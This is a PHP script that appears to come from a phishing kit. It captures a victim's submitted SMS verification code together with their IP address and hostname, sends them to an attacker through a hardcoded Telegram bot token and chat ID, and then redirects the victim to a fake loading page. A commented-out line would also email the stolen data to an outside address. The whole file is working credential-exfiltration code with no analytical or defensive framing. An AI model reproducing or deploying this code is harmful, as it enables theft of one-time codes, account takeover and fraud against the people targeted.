<?php


$chat_id = "1044835771";
$token = "950138951:AAFotYPVbifrHVJm-7ggWGogj3MrFQWbPoM";


function send_message_to_telegram($chat_id, $message, $token) {
	$url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chat_id;
	$url = $url . "&text=" . urlencode($message);
	$ch = curl_init();
	$optArray = array(
		CURLOPT_URL => $url,
		CURLOPT_RETURNTRANSFER => true
	);
	curl_setopt_array($ch, $optArray);
	$result = curl_exec($ch);
	curl_close($ch);
	return $result;
}

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "__________________HisHow0KiNg_____________\n";
$message .= "SMS              : ".$_POST['smscode']."\n";
$message .= "______________ INFOS OF MACHINE _________\n";
$message .= "Ip of Machine              : $ip\n";
$message .= "Host               : $hostname\n";
$message .= "_________| l7way  |__________\n";
$sift = "lulzma@tutanota.com";
$subject = "New SMS fr0m | $ip ";
$headers = "From: Lulz <nebaan@pickup.fr>";
//mail($sift,$subject,$message,$headers);


send_message_to_telegram($chat_id, $message, $token);

header("Location: ../settings/Loading2.php");

?>
